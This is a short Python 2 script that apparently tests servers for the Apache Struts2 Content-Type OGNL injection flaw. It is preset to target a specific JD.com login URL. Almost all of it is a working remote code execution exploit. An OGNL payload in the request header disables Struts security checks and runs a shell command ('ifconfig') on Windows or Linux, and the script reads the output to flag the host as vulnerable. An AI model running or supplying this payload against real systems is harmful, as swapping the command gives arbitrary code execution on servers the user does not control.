#!/usr/bin/env python
#coding:utf-8
import urlparse
import requests
import sys

def verify(url):
    headers = {'Content-Type': "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ifconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"}
    data = '---------------------------acebdf13572468\nContent-Disposition: form-data; name="fieldNameHere"; filename="codesec.txt"\nContent-Type: text/plain\n\nebd2e882491f6f116ff19ecc826842cab\n\n---------------------------acebdf13572468--'
    try:
        if url.endswith('.com'):
            url = url + '/index.action'
        if url.endswith('.com/'):
            url = url + 'index.action'
        if True:
            print "url --> ",url
            r = requests.post(url, data=data, headers=headers, timeout=5, allow_redirects=False)
            print r.content
            if 'inet addr' in r.content:
                return 'Vul'
        else:
            return 'DomainException'
    except requests.exceptions.ConnectionError,e:
        print e
        return 'Exception'
    except requests.exceptions.Timeout,e:
        return 'Timout'
    except Exception, e:
        return 'Exception'
    return 'Safe'

def run(url):
    result = verify(url)
    print result

if __name__ == '__main__':
    url = "http://l.jd.com/oms/login.findPassword.do"
    run(url)

